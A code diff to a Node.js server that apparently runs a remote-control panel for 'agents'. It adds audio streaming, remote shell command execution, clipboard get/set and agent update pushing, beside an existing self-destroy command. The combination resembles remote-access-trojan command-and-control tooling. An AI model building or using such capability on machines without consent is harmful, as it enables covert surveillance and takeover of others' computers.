@@ -268,6 +268,14 @@ async function onAgent(peer, req, url) {
         const dv = new DataView(body.buffer, body.byteOffset, 12);
         const w = dv.getInt32(0, true), h = dv.getInt32(4, true), mon = dv.getInt32(8, true);
         pushFrame(slot, w, h, mon, body.subarray(12));
+      } else if (type === 0x60) {
+        pushAudio(slot, body);
+      } else if (type === 0x71) {
+        pushOne(slot, { t: 'shell', slot, ...JSON.parse(new TextDecoder().decode(body)) });
+      } else if (type === 0x73) {
+        pushOne(slot, { t: 'clip', slot, ...JSON.parse(new TextDecoder().decode(body)) });
+      } else if (type === 0x75) {
+        pushOne(slot, { t: 'push', slot, ...JSON.parse(new TextDecoder().decode(body)) });
       } else if (type === 0x32) {
         const d = JSON.parse(new TextDecoder().decode(body));
         const items = d.items || [];
@@ -302,6 +310,16 @@ function pushFrame(slot, w, h, mon, jpeg) {
   const frame = Buffer.concat([head, Buffer.from(jpeg)]);
   for (const [tok, ws] of browsers) {
     if (ws.alive && ws.slot === slot) ws.send(frame);
+  }
+}
+
+function pushAudio(slot, pcm) {
+  const head = Buffer.alloc(5);
+  head[0] = 2;
+  head.writeUInt32BE(slot, 1);
+  const buf = Buffer.concat([head, Buffer.from(pcm)]);
+  for (const [tok, ws] of browsers) {
+    if (ws.alive && ws.slot === slot) ws.send(buf);
   }
 }
 
@@ -416,6 +434,30 @@ const server = http.createServer(async (req, res) => {
     const b = await body(req);
     await sendAgent(+b.slot, 0x52, {});
     logEvent(s.user, 'SELF DESTROY', 'slot ' + b.slot);
+    return json(res, 200, { ok: true });
+  }
+
+  if (p === '/api/shell' && req.method === 'POST') {
+    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht' });
+    const b = await body(req);
+    await sendAgent(+b.slot, 0x70, { id: b.id || String(Date.now()), cmd: b.cmd || '', shell: b.shell || 'cmd' });
+    logEvent(s.user, 'shell', (b.cmd || '').slice(0, 120));
+    return json(res, 200, { ok: true });
+  }
+
+  if (p === '/api/clip' && req.method === 'POST') {
+    if (s.role === 'viewer') return json(res, 403, { error: 'viewer darf nicht' });
+    const b = await body(req);
+    await sendAgent(+b.slot, 0x72, { id: b.id || String(Date.now()), act: b.act || 'get', text: b.text || '' });
+    logEvent(s.user, 'clipboard ' + (b.act || 'get'), '');
+    return json(res, 200, { ok: true });
+  }
+
+  if (p === '/api/push' && req.method === 'POST') {
+    if (s.role !== 'admin' && s.role !== 'operator') return json(res, 403, { error: 'kein recht' });
+    const b = await body(req);
+    await sendAgent(+b.slot, 0x74, { seq: String(b.seq), last: b.last ? '1' : '0', data: b.data });
+    if (b.last) logEvent(s.user, 'agent update', 'slot ' + b.slot + ' (' + (b.name || '?') + ')');
     return json(res, 200, { ok: true });
   }
 
